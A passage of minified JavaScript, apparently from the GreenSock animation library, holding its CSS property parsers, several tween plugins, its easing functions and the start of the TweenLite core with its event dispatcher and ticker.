b.y&&-1!==b.y.indexOf("%")&&(_.y=0,_.yPercent=ne(b.y,h.yPercent)),_.rotation=ae("rotation"in b?b.rotation:"shortRotation"in b?b.shortRotation+"_short":"rotationZ"in b?b.rotationZ:h.rotation,h.rotation,"rotation",P),Re&&(_.rotationX=ae("rotationX"in b?b.rotationX:"shortRotationX"in b?b.shortRotationX+"_short":h.rotationX||0,h.rotationX,"rotationX",P),_.rotationY=ae("rotationY"in b?b.rotationY:"shortRotationY"in b?b.shortRotationY+"_short":h.rotationY||0,h.rotationY,"rotationY",P)),_.skewX=null==b.skewX?h.skewX:ae(b.skewX,h.skewX),_.skewY=null==b.skewY?h.skewY:ae(b.skewY,h.skewY),(u=_.skewY-h.skewY)&&(_.skewX+=u,_.rotation+=u)}for(Re&&null!=b.force3D&&(h.force3D=b.force3D,m=!0),h.skewType=b.skewType||h.skewType||a.defaultSkewType,p=h.force3D||h.z||h.rotationX||h.rotationY||_.z||_.rotationX||_.rotationY||_.perspective,p||null==b.scale||(_.scaleZ=1);--w>-1;)i=be[w],f=_[i]-h[i],(f>x||-x>f||null!=b[i]||null!=I[i])&&(m=!0,n=new me(h,i,h[i],f,n),i in P&&(n.e=P[i]),n.xs0=0,n.plugin=o,s._overwriteProps.push(n.n));return f=b.transformOrigin,h.svg&&(f||b.svgOrigin)&&(g=h.xOffset,v=h.yOffset,ze(t,se(f),_,b.svgOrigin,b.smoothOrigin),n=de(h,"xOrigin",(y?h:_).xOrigin,_.xOrigin,n,k),n=de(h,"yOrigin",(y?h:_).yOrigin,_.yOrigin,n,k),(g!==h.xOffset||v!==h.yOffset)&&(n=de(h,"xOffset",y?g:h.xOffset,h.xOffset,n,k),n=de(h,"yOffset",y?v:h.yOffset,h.yOffset,n,k)),f=we?null:"0px 0px"),(f||Re&&p&&h.zOrigin)&&(Pe?(m=!0,i=Se,f=(f||Q(t,i,r,!1,"50% 50%"))+"",n=new me(T,i,0,0,n,-1,k),n.b=T[i],n.plugin=o,Re?(c=h.zOrigin,f=f.split(" "),h.zOrigin=(f.length>2&&(0===c||"0px"!==f[2])?parseFloat(f[2]):c)||0,n.xs0=n.e=f[0]+" "+(f[1]||"50%")+" 0px",n=new me(h,"zOrigin",0,0,n,-1,n.n),n.b=c,n.xs0=n.e=h.zOrigin):n.xs0=n.e=f):se(f+"",h)),m&&(s._transformType=h.svg&&we||!p&&3!==this._transformType?2:3),n},prefix:!0}),Te("boxShadow",{defaultValue:"0px 0px 0px 0px #999",prefix:!0,color:!0,multi:!0,keyword:"inset"}),Te("borderRadius",{defaultValue:"0px",parser:function(t,e,i,n,a){e=this.format(e);var o,l,h,_,u,c,f,p,m,d,g,v,y,T,x,w,b=["borderTopLeftRadius","borderTopRightRadius","borderBottomRightRadius","borderBottomLeftRadius"],P=t.style;for(m=parseFloat(t.offsetWidth),d=parseFloat(t.offsetHeight),o=e.split(" "),l=0;b.length>l;l++)this.p.indexOf("border")&&(b[l]=W(b[l])),u=_=Q(t,b[l],r,!1,"0px"),-1!==u.indexOf(" ")&&(_=u.split(" "),u=_[0],_=_[1]),c=h=o[l],f=parseFloat(u),v=u.substr((f+"").length),y="="===c.charAt(1),y?(p=parseInt(c.charAt(0)+"1",10),c=c.substr(2),p*=parseFloat(c),g=c.substr((p+"").length-(0>p?1:0))||""):(p=parseFloat(c),g=c.substr((p+"").length)),""===g&&(g=s[i]||v),g!==v&&(T=$(t,"borderLeft",f,v),x=$(t,"borderTop",f,v),"%"===g?(u=100*(T/m)+"%",_=100*(x/d)+"%"):"em"===g?(w=$(t,"borderLeft",1,"em"),u=T/w+"em",_=x/w+"em"):(u=T+"px",_=x+"px"),y&&(c=parseFloat(u)+p+g,h=parseFloat(_)+p+g)),a=ge(P,b[l],u+" "+_,c+" "+h,!1,"0px",a);return a},prefix:!0,formatter:ce("0px 0px 0px 0px",!1,!0)}),Te("backgroundPosition",{defaultValue:"0 0",parser:function(t,e,i,s,n,a){var o,l,h,_,u,c,f="background-position",p=r||Z(t,null),d=this.format((p?m?p.getPropertyValue(f+"-x")+" "+p.getPropertyValue(f+"-y"):p.getPropertyValue(f):t.currentStyle.backgroundPositionX+" "+t.currentStyle.backgroundPositionY)||"0 0"),g=this.format(e);
if(-1!==d.indexOf("%")!=(-1!==g.indexOf("%"))&&(c=Q(t,"backgroundImage").replace(R,""),c&&"none"!==c)){for(o=d.split(" "),l=g.split(" "),X.setAttribute("src",c),h=2;--h>-1;)d=o[h],_=-1!==d.indexOf("%"),_!==(-1!==l[h].indexOf("%"))&&(u=0===h?t.offsetWidth-X.width:t.offsetHeight-X.height,o[h]=_?parseFloat(d)/100*u+"px":100*(parseFloat(d)/u)+"%");d=o.join(" ")}return this.parseComplex(t.style,d,g,n,a)},formatter:se}),Te("backgroundSize",{defaultValue:"0 0",formatter:se}),Te("perspective",{defaultValue:"0px",prefix:!0}),Te("perspectiveOrigin",{defaultValue:"50% 50%",prefix:!0}),Te("transformStyle",{prefix:!0}),Te("backfaceVisibility",{prefix:!0}),Te("userSelect",{prefix:!0}),Te("margin",{parser:fe("marginTop,marginRight,marginBottom,marginLeft")}),Te("padding",{parser:fe("paddingTop,paddingRight,paddingBottom,paddingLeft")}),Te("clip",{defaultValue:"rect(0px,0px,0px,0px)",parser:function(t,e,i,s,n,a){var o,l,h;return 9>m?(l=t.currentStyle,h=8>m?" ":",",o="rect("+l.clipTop+h+l.clipRight+h+l.clipBottom+h+l.clipLeft+")",e=this.format(e).split(",").join(h)):(o=this.format(Q(t,this.p,r,!1,this.dflt)),e=this.format(e)),this.parseComplex(t.style,o,e,n,a)}}),Te("textShadow",{defaultValue:"0px 0px 0px #999",color:!0,multi:!0}),Te("autoRound,strictUnits",{parser:function(t,e,i,s,r){return r}}),Te("border",{defaultValue:"0px solid #000",parser:function(t,e,i,s,n,a){return this.parseComplex(t.style,this.format(Q(t,"borderTopWidth",r,!1,"0px")+" "+Q(t,"borderTopStyle",r,!1,"solid")+" "+Q(t,"borderTopColor",r,!1,"#000")),this.format(e),n,a)},color:!0,formatter:function(t){var e=t.split(" ");return e[0]+" "+(e[1]||"solid")+" "+(t.match(ue)||["#000"])[0]}}),Te("borderWidth",{parser:fe("borderTopWidth,borderRightWidth,borderBottomWidth,borderLeftWidth")}),Te("float,cssFloat,styleFloat",{parser:function(t,e,i,s,r){var n=t.style,a="cssFloat"in n?"cssFloat":"styleFloat";return new me(n,a,0,0,r,-1,i,!1,0,n[a],e)}});var Be=function(t){var e,i=this.t,s=i.filter||Q(this.data,"filter")||"",r=0|this.s+this.c*t;100===r&&(-1===s.indexOf("atrix(")&&-1===s.indexOf("radient(")&&-1===s.indexOf("oader(")?(i.removeAttribute("filter"),e=!Q(this.data,"filter")):(i.filter=s.replace(b,""),e=!0)),e||(this.xn1&&(i.filter=s=s||"alpha(opacity="+r+")"),-1===s.indexOf("pacity")?0===r&&this.xn1||(i.filter=s+" alpha(opacity="+r+")"):i.filter=s.replace(x,"opacity="+r))};Te("opacity,alpha,autoAlpha",{defaultValue:"1",parser:function(t,e,i,s,n,a){var o=parseFloat(Q(t,"opacity",r,!1,"1")),l=t.style,h="autoAlpha"===i;return"string"==typeof e&&"="===e.charAt(1)&&(e=("-"===e.charAt(0)?-1:1)*parseFloat(e.substr(2))+o),h&&1===o&&"hidden"===Q(t,"visibility",r)&&0!==e&&(o=0),Y?n=new me(l,"opacity",o,e-o,n):(n=new me(l,"opacity",100*o,100*(e-o),n),n.xn1=h?1:0,l.zoom=1,n.type=2,n.b="alpha(opacity="+n.s+")",n.e="alpha(opacity="+(n.s+n.c)+")",n.data=t,n.plugin=a,n.setRatio=Be),h&&(n=new me(l,"visibility",0,0,n,-1,null,!1,0,0!==o?"inherit":"hidden",0===e?"hidden":"inherit"),n.xs0="inherit",s._overwriteProps.push(n.n),s._overwriteProps.push(i)),n}});var je=function(t,e){e&&(t.removeProperty?(("ms"===e.substr(0,2)||"webkit"===e.substr(0,6))&&(e="-"+e),t.removeProperty(e.replace(k,"-$1").toLowerCase())):t.removeAttribute(e))},Ye=function(t){if(this.t._gsClassPT=this,1===t||0===t){this.t.setAttribute("class",0===t?this.b:this.e);for(var e=this.data,i=this.t.style;e;)e.v?i[e.p]=e.v:je(i,e.p),e=e._next;1===t&&this.t._gsClassPT===this&&(this.t._gsClassPT=null)}else this.t.getAttribute("class")!==this.e&&this.t.setAttribute("class",this.e)};Te("className",{parser:function(t,e,s,n,a,o,l){var h,_,u,c,f,p=t.getAttribute("class")||"",m=t.style.cssText;if(a=n._classNamePT=new me(t,s,0,0,a,2),a.setRatio=Ye,a.pr=-11,i=!0,a.b=p,_=K(t,r),u=t._gsClassPT){for(c={},f=u.data;f;)c[f.p]=1,f=f._next;u.setRatio(1)}return t._gsClassPT=a,a.e="="!==e.charAt(1)?e:p.replace(RegExp("\\s*\\b"+e.substr(2)+"\\b"),"")+("+"===e.charAt(0)?" "+e.substr(2):""),t.setAttribute("class",a.e),h=J(t,_,K(t),l,c),t.setAttribute("class",p),a.data=h.firstMPT,t.style.cssText=m,a=a.xfirst=n.parse(t,h.difs,a,o)}});var Ue=function(t){if((1===t||0===t)&&this.data._totalTime===this.data._totalDuration&&"isFromStart"!==this.data.data){var e,i,s,r,n,a=this.t.style,o=l.transform.parse;if("all"===this.e)a.cssText="",r=!0;else for(e=this.e.split(" ").join("").split(","),s=e.length;--s>-1;)i=e[s],l[i]&&(l[i].parse===o?r=!0:i="transformOrigin"===i?Se:l[i].p),je(a,i);r&&(je(a,Pe),n=this.t._gsTransform,n&&(n.svg&&this.t.removeAttribute("data-svg-origin"),delete this.t._gsTransform))}};for(Te("clearProps",{parser:function(t,e,s,r,n){return n=new me(t,s,0,0,n,2),n.setRatio=Ue,n.e=e,n.pr=-10,n.data=r._tween,i=!0,n}}),h="bezier,throwProps,physicsProps,physics2D".split(","),ve=h.length;ve--;)xe(h[ve]);h=a.prototype,h._firstPT=h._lastParsedTransform=h._transform=null,h._onInitTween=function(t,e,o){if(!t.nodeType)return!1;this._target=t,this._tween=o,this._vars=e,_=e.autoRound,i=!1,s=e.suffixMap||a.suffixMap,r=Z(t,""),n=this._overwriteProps;var h,f,m,d,g,v,y,T,x,b=t.style;if(u&&""===b.zIndex&&(h=Q(t,"zIndex",r),("auto"===h||""===h)&&this._addLazySet(b,"zIndex",0)),"string"==typeof e&&(d=b.cssText,h=K(t,r),b.cssText=d+";"+e,h=J(t,h,K(t)).difs,!Y&&w.test(e)&&(h.opacity=parseFloat(RegExp.$1)),e=h,b.cssText=d),this._firstPT=f=e.className?l.className.parse(t,e.className,"className",this,null,null,e):this.parse(t,e,null),this._transformType){for(x=3===this._transformType,Pe?c&&(u=!0,""===b.zIndex&&(y=Q(t,"zIndex",r),("auto"===y||""===y)&&this._addLazySet(b,"zIndex",0)),p&&this._addLazySet(b,"WebkitBackfaceVisibility",this._vars.WebkitBackfaceVisibility||(x?"visible":"hidden"))):b.zoom=1,m=f;m&&m._next;)m=m._next;T=new me(t,"transform",0,0,null,2),this._linkCSSP(T,null,m),T.setRatio=Pe?Xe:Le,T.data=this._transform||Ne(t,r,!0),T.tween=o,T.pr=-1,n.pop()}if(i){for(;f;){for(v=f._next,m=d;m&&m.pr>f.pr;)m=m._next;(f._prev=m?m._prev:g)?f._prev._next=f:d=f,(f._next=m)?m._prev=f:g=f,f=v}this._firstPT=d}return!0},h.parse=function(t,e,i,n){var a,o,h,u,c,f,p,m,d,g,v=t.style;for(a in e)f=e[a],o=l[a],o?i=o.parse(t,f,a,this,i,n,e):(c=Q(t,a,r)+"",d="string"==typeof f,"color"===a||"fill"===a||"stroke"===a||-1!==a.indexOf("Color")||d&&P.test(f)?(d||(f=he(f),f=(f.length>3?"rgba(":"rgb(")+f.join(",")+")"),i=ge(v,a,c,f,!0,"transparent",i,0,n)):!d||-1===f.indexOf(" ")&&-1===f.indexOf(",")?(h=parseFloat(c),p=h||0===h?c.substr((h+"").length):"",(""===c||"auto"===c)&&("width"===a||"height"===a?(h=ie(t,a,r),p="px"):"left"===a||"top"===a?(h=H(t,a,r),p="px"):(h="opacity"!==a?0:1,p="")),g=d&&"="===f.charAt(1),g?(u=parseInt(f.charAt(0)+"1",10),f=f.substr(2),u*=parseFloat(f),m=f.replace(T,"")):(u=parseFloat(f),m=d?f.replace(T,""):""),""===m&&(m=a in s?s[a]:p),f=u||0===u?(g?u+h:u)+m:e[a],p!==m&&""!==m&&(u||0===u)&&h&&(h=$(t,a,h,p),"%"===m?(h/=$(t,a,100,"%")/100,e.strictUnits!==!0&&(c=h+"%")):"em"===m||"rem"===m?h/=$(t,a,1,m):"px"!==m&&(u=$(t,a,u,m),m="px"),g&&(u||0===u)&&(f=u+h+m)),g&&(u+=h),!h&&0!==h||!u&&0!==u?void 0!==v[a]&&(f||"NaN"!=f+""&&null!=f)?(i=new me(v,a,u||h||0,0,i,-1,a,!1,0,c,f),i.xs0="none"!==f||"display"!==a&&-1===a.indexOf("Style")?f:c):q("invalid "+a+" tween value: "+e[a]):(i=new me(v,a,h,u-h,i,0,a,_!==!1&&("px"===m||"zIndex"===a),0,c,f),i.xs0=m)):i=ge(v,a,c,f,!0,null,i,0,n)),n&&i&&!i.plugin&&(i.plugin=n);return i},h.setRatio=function(t){var e,i,s,r=this._firstPT,n=1e-6;if(1!==t||this._tween._time!==this._tween._duration&&0!==this._tween._time)if(t||this._tween._time!==this._tween._duration&&0!==this._tween._time||this._tween._rawPrevTime===-1e-6)for(;r;){if(e=r.c*t+r.s,r.r?e=Math.round(e):n>e&&e>-n&&(e=0),r.type)if(1===r.type)if(s=r.l,2===s)r.t[r.p]=r.xs0+e+r.xs1+r.xn1+r.xs2;else if(3===s)r.t[r.p]=r.xs0+e+r.xs1+r.xn1+r.xs2+r.xn2+r.xs3;else if(4===s)r.t[r.p]=r.xs0+e+r.xs1+r.xn1+r.xs2+r.xn2+r.xs3+r.xn3+r.xs4;else if(5===s)r.t[r.p]=r.xs0+e+r.xs1+r.xn1+r.xs2+r.xn2+r.xs3+r.xn3+r.xs4+r.xn4+r.xs5;else{for(i=r.xs0+e+r.xs1,s=1;r.l>s;s++)i+=r["xn"+s]+r["xs"+(s+1)];r.t[r.p]=i}else-1===r.type?r.t[r.p]=r.xs0:r.setRatio&&r.setRatio(t);else r.t[r.p]=e+r.xs0;r=r._next}else for(;r;)2!==r.type?r.t[r.p]=r.b:r.setRatio(t),r=r._next;else for(;r;){if(2!==r.type)if(r.r&&-1!==r.type)if(e=Math.round(r.s+r.c),r.type){if(1===r.type){for(s=r.l,i=r.xs0+e+r.xs1,s=1;r.l>s;s++)i+=r["xn"+s]+r["xs"+(s+1)];r.t[r.p]=i}}else r.t[r.p]=e+r.xs0;else r.t[r.p]=r.e;else r.setRatio(t);r=r._next}},h._enableTransforms=function(t){this._transform=this._transform||Ne(this._target,r,!0),this._transformType=this._transform.svg&&we||!t&&3!==this._transformType?2:3};var qe=function(){this.t[this.p]=this.e,this.data._linkCSSP(this,this._next,null,!0)};h._addLazySet=function(t,e,i){var s=this._firstPT=new me(t,e,0,0,this._firstPT,2);s.e=i,s.setRatio=qe,s.data=this},h._linkCSSP=function(t,e,i,s){return t&&(e&&(e._prev=t),t._next&&(t._next._prev=t._prev),t._prev?t._prev._next=t._next:this._firstPT===t&&(this._firstPT=t._next,s=!0),i?i._next=t:s||null!==this._firstPT||(this._firstPT=t),t._next=e,t._prev=i),t},h._kill=function(e){var i,s,r,n=e;if(e.autoAlpha||e.alpha){n={};for(s in e)n[s]=e[s];n.opacity=1,n.autoAlpha&&(n.visibility=1)}return e.className&&(i=this._classNamePT)&&(r=i.xfirst,r&&r._prev?this._linkCSSP(r._prev,i._next,r._prev._prev):r===this._firstPT&&(this._firstPT=i._next),i._next&&this._linkCSSP(i._next,i._next._next,r._prev),this._classNamePT=null),t.prototype._kill.call(this,n)};var Ve=function(t,e,i){var s,r,n,a;if(t.slice)for(r=t.length;--r>-1;)Ve(t[r],e,i);else for(s=t.childNodes,r=s.length;--r>-1;)n=s[r],a=n.type,n.style&&(e.push(K(n)),i&&i.push(n)),1!==a&&9!==a&&11!==a||!n.childNodes.length||Ve(n,e,i)};return a.cascadeTo=function(t,i,s){var r,n,a,o,l=e.to(t,i,s),h=[l],_=[],u=[],c=[],f=e._internals.reservedProps;for(t=l._targets||l.target,Ve(t,_,c),l.render(i,!0,!0),Ve(t,u),l.render(0,!0,!0),l._enabled(!0),r=c.length;--r>-1;)if(n=J(c[r],_[r],u[r]),n.firstMPT){n=n.difs;for(a in s)f[a]&&(n[a]=s[a]);o={};for(a in n)o[a]=_[r][a];h.push(e.fromTo(c[r],i,o,n))}return h},t.activate([a]),a},!0),function(){var t=_gsScope._gsDefine.plugin({propName:"roundProps",version:"1.5",priority:-1,API:2,init:function(t,e,i){return this._tween=i,!0}}),e=function(t){for(;t;)t.f||t.blob||(t.r=1),t=t._next},i=t.prototype;i._onInitAllProps=function(){for(var t,i,s,r=this._tween,n=r.vars.roundProps.join?r.vars.roundProps:r.vars.roundProps.split(","),a=n.length,o={},l=r._propLookup.roundProps;--a>-1;)o[n[a]]=1;for(a=n.length;--a>-1;)for(t=n[a],i=r._firstPT;i;)s=i._next,i.pg?i.t._roundProps(o,!0):i.n===t&&(2===i.f&&i.t?e(i.t._firstPT):(this._add(i.t,t,i.s,i.c),s&&(s._prev=i._prev),i._prev?i._prev._next=s:r._firstPT===i&&(r._firstPT=s),i._next=i._prev=null,r._propLookup[t]=l)),i=s;return!1},i._add=function(t,e,i,s){this._addTween(t,e,i,i+s,e,!0),this._overwriteProps.push(e)}}(),function(){_gsScope._gsDefine.plugin({propName:"attr",API:2,version:"0.5.0",init:function(t,e){var i;if("function"!=typeof t.setAttribute)return!1;for(i in e)this._addTween(t,"setAttribute",t.getAttribute(i)+"",e[i]+"",i,!1,i),this._overwriteProps.push(i);return!0}})}(),_gsScope._gsDefine.plugin({propName:"directionalRotation",version:"0.2.1",API:2,init:function(t,e){"object"!=typeof e&&(e={rotation:e}),this.finals={};var i,s,r,n,a,o,l=e.useRadians===!0?2*Math.PI:360,h=1e-6;for(i in e)"useRadians"!==i&&(o=(e[i]+"").split("_"),s=o[0],r=parseFloat("function"!=typeof t[i]?t[i]:t[i.indexOf("set")||"function"!=typeof t["get"+i.substr(3)]?i:"get"+i.substr(3)]()),n=this.finals[i]="string"==typeof s&&"="===s.charAt(1)?r+parseInt(s.charAt(0)+"1",10)*Number(s.substr(2)):Number(s)||0,a=n-r,o.length&&(s=o.join("_"),-1!==s.indexOf("short")&&(a%=l,a!==a%(l/2)&&(a=0>a?a+l:a-l)),-1!==s.indexOf("_cw")&&0>a?a=(a+9999999999*l)%l-(0|a/l)*l:-1!==s.indexOf("ccw")&&a>0&&(a=(a-9999999999*l)%l-(0|a/l)*l)),(a>h||-h>a)&&(this._addTween(t,i,r,r+a,i),this._overwriteProps.push(i)));return!0},set:function(t){var e;if(1!==t)this._super.setRatio.call(this,t);else for(e=this._firstPT;e;)e.f?e.t[e.p](this.finals[e.p]):e.t[e.p]=this.finals[e.p],e=e._next}})._autoCSS=!0,_gsScope._gsDefine("easing.Back",["easing.Ease"],function(t){var e,i,s,r=_gsScope.GreenSockGlobals||_gsScope,n=r.com.greensock,a=2*Math.PI,o=Math.PI/2,l=n._class,h=function(e,i){var s=l("easing."+e,function(){},!0),r=s.prototype=new t;return r.constructor=s,r.getRatio=i,s},_=t.register||function(){},u=function(t,e,i,s){var r=l("easing."+t,{easeOut:new e,easeIn:new i,easeInOut:new s},!0);return _(r,t),r},c=function(t,e,i){this.t=t,this.v=e,i&&(this.next=i,i.prev=this,this.c=i.v-e,this.gap=i.t-t)},f=function(e,i){var s=l("easing."+e,function(t){this._p1=t||0===t?t:1.70158,this._p2=1.525*this._p1},!0),r=s.prototype=new t;return r.constructor=s,r.getRatio=i,r.config=function(t){return new s(t)},s},p=u("Back",f("BackOut",function(t){return(t-=1)*t*((this._p1+1)*t+this._p1)+1}),f("BackIn",function(t){return t*t*((this._p1+1)*t-this._p1)}),f("BackInOut",function(t){return 1>(t*=2)?.5*t*t*((this._p2+1)*t-this._p2):.5*((t-=2)*t*((this._p2+1)*t+this._p2)+2)})),m=l("easing.SlowMo",function(t,e,i){e=e||0===e?e:.7,null==t?t=.7:t>1&&(t=1),this._p=1!==t?e:0,this._p1=(1-t)/2,this._p2=t,this._p3=this._p1+this._p2,this._calcEnd=i===!0},!0),d=m.prototype=new t;return d.constructor=m,d.getRatio=function(t){var e=t+(.5-t)*this._p;return this._p1>t?this._calcEnd?1-(t=1-t/this._p1)*t:e-(t=1-t/this._p1)*t*t*t*e:t>this._p3?this._calcEnd?1-(t=(t-this._p3)/this._p1)*t:e+(t-e)*(t=(t-this._p3)/this._p1)*t*t*t:this._calcEnd?1:e},m.ease=new m(.7,.7),d.config=m.config=function(t,e,i){return new m(t,e,i)},e=l("easing.SteppedEase",function(t){t=t||1,this._p1=1/t,this._p2=t+1},!0),d=e.prototype=new t,d.constructor=e,d.getRatio=function(t){return 0>t?t=0:t>=1&&(t=.999999999),(this._p2*t>>0)*this._p1},d.config=e.config=function(t){return new e(t)},i=l("easing.RoughEase",function(e){e=e||{};for(var i,s,r,n,a,o,l=e.taper||"none",h=[],_=0,u=0|(e.points||20),f=u,p=e.randomize!==!1,m=e.clamp===!0,d=e.template instanceof t?e.template:null,g="number"==typeof e.strength?.4*e.strength:.4;--f>-1;)i=p?Math.random():1/u*f,s=d?d.getRatio(i):i,"none"===l?r=g:"out"===l?(n=1-i,r=n*n*g):"in"===l?r=i*i*g:.5>i?(n=2*i,r=.5*n*n*g):(n=2*(1-i),r=.5*n*n*g),p?s+=Math.random()*r-.5*r:f%2?s+=.5*r:s-=.5*r,m&&(s>1?s=1:0>s&&(s=0)),h[_++]={x:i,y:s};for(h.sort(function(t,e){return t.x-e.x}),o=new c(1,1,null),f=u;--f>-1;)a=h[f],o=new c(a.x,a.y,o);this._prev=new c(0,0,0!==o.t?o:o.next)},!0),d=i.prototype=new t,d.constructor=i,d.getRatio=function(t){var e=this._prev;if(t>e.t){for(;e.next&&t>=e.t;)e=e.next;e=e.prev}else for(;e.prev&&e.t>=t;)e=e.prev;return this._prev=e,e.v+(t-e.t)/e.gap*e.c},d.config=function(t){return new i(t)},i.ease=new i,u("Bounce",h("BounceOut",function(t){return 1/2.75>t?7.5625*t*t:2/2.75>t?7.5625*(t-=1.5/2.75)*t+.75:2.5/2.75>t?7.5625*(t-=2.25/2.75)*t+.9375:7.5625*(t-=2.625/2.75)*t+.984375}),h("BounceIn",function(t){return 1/2.75>(t=1-t)?1-7.5625*t*t:2/2.75>t?1-(7.5625*(t-=1.5/2.75)*t+.75):2.5/2.75>t?1-(7.5625*(t-=2.25/2.75)*t+.9375):1-(7.5625*(t-=2.625/2.75)*t+.984375)}),h("BounceInOut",function(t){var e=.5>t;return t=e?1-2*t:2*t-1,t=1/2.75>t?7.5625*t*t:2/2.75>t?7.5625*(t-=1.5/2.75)*t+.75:2.5/2.75>t?7.5625*(t-=2.25/2.75)*t+.9375:7.5625*(t-=2.625/2.75)*t+.984375,e?.5*(1-t):.5*t+.5})),u("Circ",h("CircOut",function(t){return Math.sqrt(1-(t-=1)*t)}),h("CircIn",function(t){return-(Math.sqrt(1-t*t)-1)}),h("CircInOut",function(t){return 1>(t*=2)?-.5*(Math.sqrt(1-t*t)-1):.5*(Math.sqrt(1-(t-=2)*t)+1)})),s=function(e,i,s){var r=l("easing."+e,function(t,e){this._p1=t>=1?t:1,this._p2=(e||s)/(1>t?t:1),this._p3=this._p2/a*(Math.asin(1/this._p1)||0),this._p2=a/this._p2},!0),n=r.prototype=new t;return n.constructor=r,n.getRatio=i,n.config=function(t,e){return new r(t,e)},r},u("Elastic",s("ElasticOut",function(t){return this._p1*Math.pow(2,-10*t)*Math.sin((t-this._p3)*this._p2)+1},.3),s("ElasticIn",function(t){return-(this._p1*Math.pow(2,10*(t-=1))*Math.sin((t-this._p3)*this._p2))},.3),s("ElasticInOut",function(t){return 1>(t*=2)?-.5*this._p1*Math.pow(2,10*(t-=1))*Math.sin((t-this._p3)*this._p2):.5*this._p1*Math.pow(2,-10*(t-=1))*Math.sin((t-this._p3)*this._p2)+1},.45)),u("Expo",h("ExpoOut",function(t){return 1-Math.pow(2,-10*t)}),h("ExpoIn",function(t){return Math.pow(2,10*(t-1))-.001}),h("ExpoInOut",function(t){return 1>(t*=2)?.5*Math.pow(2,10*(t-1)):.5*(2-Math.pow(2,-10*(t-1)))})),u("Sine",h("SineOut",function(t){return Math.sin(t*o)}),h("SineIn",function(t){return-Math.cos(t*o)+1}),h("SineInOut",function(t){return-.5*(Math.cos(Math.PI*t)-1)})),l("easing.EaseLookup",{find:function(e){return t.map[e]}},!0),_(r.SlowMo,"SlowMo","ease,"),_(i,"RoughEase","ease,"),_(e,"SteppedEase","ease,"),p},!0)}),_gsScope._gsDefine&&_gsScope._gsQueue.pop()(),function(t,e){"use strict";var i=t.GreenSockGlobals=t.GreenSockGlobals||t;if(!i.TweenLite){var s,r,n,a,o,l=function(t){var e,s=t.split("."),r=i;for(e=0;s.length>e;e++)r[s[e]]=r=r[s[e]]||{};return r},h=l("com.greensock"),_=1e-10,u=function(t){var e,i=[],s=t.length;for(e=0;e!==s;i.push(t[e++]));return i},c=function(){},f=function(){var t=Object.prototype.toString,e=t.call([]);return function(i){return null!=i&&(i instanceof Array||"object"==typeof i&&!!i.push&&t.call(i)===e)}}(),p={},m=function(s,r,n,a){this.sc=p[s]?p[s].sc:[],p[s]=this,this.gsClass=null,this.func=n;var o=[];this.check=function(h){for(var _,u,c,f,d,g=r.length,v=g;--g>-1;)(_=p[r[g]]||new m(r[g],[])).gsClass?(o[g]=_.gsClass,v--):h&&_.sc.push(this);if(0===v&&n)for(u=("com.greensock."+s).split("."),c=u.pop(),f=l(u.join("."))[c]=this.gsClass=n.apply(n,o),a&&(i[c]=f,d="undefined"!=typeof module&&module.exports,!d&&"function"==typeof define&&define.amd?define((t.GreenSockAMDPath?t.GreenSockAMDPath+"/":"")+s.split(".").pop(),[],function(){return f}):s===e&&d&&(module.exports=f)),g=0;this.sc.length>g;g++)this.sc[g].check()},this.check(!0)},d=t._gsDefine=function(t,e,i,s){return new m(t,e,i,s)},g=h._class=function(t,e,i){return e=e||function(){},d(t,[],function(){return e},i),e};d.globals=i;var v=[0,0,1,1],y=[],T=g("easing.Ease",function(t,e,i,s){this._func=t,this._type=i||0,this._power=s||0,this._params=e?v.concat(e):v},!0),x=T.map={},w=T.register=function(t,e,i,s){for(var r,n,a,o,l=e.split(","),_=l.length,u=(i||"easeIn,easeOut,easeInOut").split(",");--_>-1;)for(n=l[_],r=s?g("easing."+n,null,!0):h.easing[n]||{},a=u.length;--a>-1;)o=u[a],x[n+"."+o]=x[o+n]=r[o]=t.getRatio?t:t[o]||new t};for(n=T.prototype,n._calcEnd=!1,n.getRatio=function(t){if(this._func)return this._params[0]=t,this._func.apply(null,this._params);var e=this._type,i=this._power,s=1===e?1-t:2===e?t:.5>t?2*t:2*(1-t);return 1===i?s*=s:2===i?s*=s*s:3===i?s*=s*s*s:4===i&&(s*=s*s*s*s),1===e?1-s:2===e?s:.5>t?s/2:1-s/2},s=["Linear","Quad","Cubic","Quart","Quint,Strong"],r=s.length;--r>-1;)n=s[r]+",Power"+r,w(new T(null,null,1,r),n,"easeOut",!0),w(new T(null,null,2,r),n,"easeIn"+(0===r?",easeNone":"")),w(new T(null,null,3,r),n,"easeInOut");x.linear=h.easing.Linear.easeIn,x.swing=h.easing.Quad.easeInOut;var b=g("events.EventDispatcher",function(t){this._listeners={},this._eventTarget=t||this});n=b.prototype,n.addEventListener=function(t,e,i,s,r){r=r||0;var n,l,h=this._listeners[t],_=0;for(null==h&&(this._listeners[t]=h=[]),l=h.length;--l>-1;)n=h[l],n.c===e&&n.s===i?h.splice(l,1):0===_&&r>n.pr&&(_=l+1);h.splice(_,0,{c:e,s:i,up:s,pr:r}),this!==a||o||a.wake()},n.removeEventListener=function(t,e){var i,s=this._listeners[t];if(s)for(i=s.length;--i>-1;)if(s[i].c===e)return s.splice(i,1),void 0},n.dispatchEvent=function(t){var e,i,s,r=this._listeners[t];if(r)for(e=r.length,i=this._eventTarget;--e>-1;)s=r[e],s&&(s.up?s.c.call(s.s||i,{type:t,target:i}):s.c.call(s.s||i))};var P=t.requestAnimationFrame,k=t.cancelAnimationFrame,S=Date.now||function(){return(new Date).getTime()},R=S();for(s=["ms","moz","webkit","o"],r=s.length;--r>-1&&!P;)P=t[s[r]+"RequestAnimationFrame"],k=t[s[r]+"CancelAnimationFrame"]||t[s[r]+"CancelRequestAnimationFrame"];g("Ticker",function(t,e){var i,s,r,n,l,h=this,u=S(),f=e!==!1&&P,p=500,m=33,d="tick",g=function(t){var e,a,o=S()-R;o>p&&(u+=o-m),R+=o,h.time=(R-u)/1e3,e=h.time-l,(!i||e>0||t===!0)&&(h.frame++,l+=e+(e>=n?.004:n-e),a=!0),t!==!0&&(r=s(g)),a&&h.dispatchEvent(d)};b.call(h),h.time=h.frame=0,h.tick=function(){g(!0)},h.lagSmoothing=function(t,e){p=t||1/_,m=Math.min(e,p,0)},h.sleep=function(){null!=r&&(f&&k?k(r):clearTimeout(r),s=c,r=null,h===a&&(o=!1))},h.wake=function(){null!==r?h.sleep():h.frame>10&&(R=S()-p+5),s=0===i?c:f&&P?P:function(t){return setTimeout(t,0|1e3*(l-h.time)+1)},h===a&&(o=!0),g(2)},h.fps=function(t){return arguments.length?(i=t,n=1/(i||60),l=this.time+n,h.wake(),void 0):i},h.useRAF=function(t){return arguments.length?(h.sleep(),f=t,h.fps(i),void 